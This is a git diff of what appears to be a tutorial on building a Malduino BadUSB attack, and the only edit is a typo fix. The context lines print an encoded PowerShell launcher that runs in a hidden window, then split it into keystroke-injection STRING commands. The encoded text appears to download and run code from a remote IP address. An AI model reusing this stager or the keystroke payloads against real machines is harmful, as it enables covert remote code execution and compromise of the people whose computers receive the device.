@@ -93,7 +93,7 @@ powershell.exe -NoP -sta -NonI -W Hidden -Enc EditedForPrivacyPurposeAVAByAGkAZA
 ```
 **2 - Convert the launcher to STRING commands.** 
 
-Malduino command buffer has a size of 256b so the payload must be fragmented. This can be done with the [converter](https://malduino.com/converter/).
+Malduino command buffer has a size of 256B so the payload must be fragmented. This can be done with the [converter](https://malduino.com/converter/).
 ```
 STRING EditedForPrivacyPurposeAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgARQBhAEQARQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBPAHgAeQAgAD0AIABbAFMAWQBTAHQAZ
 STRING QBAC4AByAFsAXQBdACQAYgA9ACgAWwBDAGgAQQBSAFsAXQBdACgAJAB3AEMALgBEAE8AdwBuAEwAbwBhAGQAUwB0AHIAaQBOAEcAKAAiAGgAdAB0AHAAOgAvAC8AOAAzAC4AMQA2ADUALgAxADQAMgAuADUANwA6ADgAMAA4ADAALwBpAG4AZABlAHgALgBhAHMAcAAiBTAFkAcACkAKQApAHwAJQB7ACQAXwAtAEIAWwuAE4ARQBUAC4
